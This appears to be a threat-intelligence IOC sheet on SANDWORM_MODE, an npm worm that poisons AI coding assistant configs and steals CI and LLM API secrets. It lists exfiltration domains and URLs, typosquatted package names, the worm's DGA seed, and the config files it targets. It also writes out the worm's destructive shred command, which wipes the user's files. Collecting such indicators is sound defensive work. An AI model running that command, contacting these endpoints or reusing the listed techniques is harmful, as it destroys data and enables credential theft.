# IOCs: SANDWORM_MODE - Shai-Hulud-Style npm Worm Targeting AI Toolchains

**Source:** https://cyberscoop.com/sandworm-mode-malware-ai-supply-chain-crowdstrike/
**Date collected:** 2026-07-22

## Campaign Overview

SANDWORM_MODE is a multi-stage npm supply chain worm (first discovered by Socket in February 2026) that spreads via typosquatting, steals CI/CD secrets, targets AI coding assistants via MCP server injection, and exfiltrates data through multiple channels. CrowdStrike published a detection engineering analysis in July 2026.

---

domain:
- freefan.net
- fanfree.net

url:
- https://pkg-metrics.official334.workers.dev/exfil
- https://github.com/ci-quality/code-quality-check/

sha256:
- (no specific file hashes published in the source articles)

---

## Malicious npm Packages (Typosquatted)

### Publisher alias: official334
- suport-color (typosquatting supports-color)
- claud-code (typosquatting Claude Code)
- cloude
- cloude-code
- crypto-locale
- crypto-reader-info
- detect-cache
- format-defaults
- hardhta
- locale-loader-pro
- naniod
- node-native-bridge
- opencraw (typosquatting OpenClaw)
- parse-compat
- rimarf
- scan-store
- secp256
- veim
- yarsg
- ethres
- iru-caches
- iruchache
- uudi

### Publisher alias: javaorg
- (associated with the campaign; specific packages not enumerated separately)

---

## C2 and Exfiltration Infrastructure

| Channel | Details |
|---|---|
| HTTPS (Cloudflare Worker) | https://pkg-metrics.official334.workers.dev/exfil |
| GitHub API | Attacker-controlled private repositories via double-base64 encoding |
| DNS tunneling (primary) | base32-encoded queries to freefan.net |
| DNS tunneling (secondary) | base32-encoded queries to fanfree.net |
| DGA fallback | Seed: "sw2025" — generates domains across ten TLDs |

---

## Additional Detection Indicators

- **Environment variable switches:** SANDWORM_* (runtime control logic gates)
- **Dead switch:** Triggered when both GitHub (exfiltration) and npm (propagation) access are lost — runs `find ~ -type f -writable -user $USER -print0 | xargs -0 shred -uvz -n 1`
- **Polymorphic engine:** Configured to use local Ollama at http://localhost:11434/api/generate with model deepseek-coder:6.7b (currently disabled)
- **Time gate:** 48-hour base delay (172800000 ms) + up to 48h jitter per machine (derived from MD5 of hostname+username); CI environments bypass entirely
- **CI env detection:** GITHUB_ACTIONS, GITLAB_CI, CIRCLECI, JENKINS_URL, BUILDKITE
- **AI assistant config targets:** ~/.claude/settings.json, ~/.cursor/mcp.json, ~/.continue/config.json, ~/.windsurf/mcp.json
- **Persistence:** git config --global init.templateDir pointing to ~/.git-templates/hooks/
- **Local test registry:** http://localhost:4873 (Verdaccio) used in simulation mode

## LLM API Keys Targeted

OpenAI, Anthropic, Google, Groq, Together, Fireworks, Replicate, Mistral, Cohere

## Pages visited

- L1: https://cyberscoop.com/sandworm-mode-malware-ai-supply-chain-crowdstrike/ (no IOCs in article body)
- L2: https://socket.dev/blog/sandworm-mode-npm-worm-ai-toolchain-poisoning (primary IOC source — domains, URLs, package names, publisher aliases)
- L2: https://www.crowdstrike.com/en-us/blog/denying-the-worm-sandworm-mode-and-ai-toolchain-supply-chain-attacks/ (IoA analysis, no specific IOCs beyond what Socket reported)
